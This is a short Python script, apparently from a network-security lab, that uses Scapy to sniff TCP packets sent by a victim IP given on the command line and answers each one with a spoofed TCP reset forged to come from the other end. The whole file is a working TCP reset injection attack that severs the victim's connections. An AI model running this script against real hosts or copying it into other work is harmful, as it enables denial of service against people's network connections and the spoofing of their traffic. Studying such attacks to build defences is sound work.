#!/usr/bin/python3

#running command: python Sniffer.py victimIP

import sys  #for command line argument
import time
from random import randint
from scapy.all import *
from scapy.layers.inet import *
import scapy

victim_ip = sys.argv[1]

def sendRST(pkt):
    print(pkt.summary())

    print("IP source = " + str(pkt[IP].src))
    print("Port source = " + str(pkt[TCP].sport))

    print("IP dest = " + str(pkt[IP].dst))
    print("Port dest = " + str(pkt[TCP].dport))

    print("IP len = " + str(pkt[IP].len))
    print("SEQ = " + str(pkt[TCP].seq))
    print("ACK = " + str(pkt[TCP].ack))
    print("Window = " + str(pkt[TCP].window))

    print()

    IPLayer = IP(dst=victim_ip, src=pkt[IP].dst)
    TCPLayer = TCP(flags="R", seq=pkt[TCP].ack, dport=pkt[TCP].sport, sport=pkt[TCP].dport)
    spoofpkt = IPLayer/TCPLayer
    send(spoofpkt, verbose=1)

    time.sleep(randint(1, 2))


pkt = sniff(filter="tcp and src host " + victim_ip, prn=sendRST, store=0)

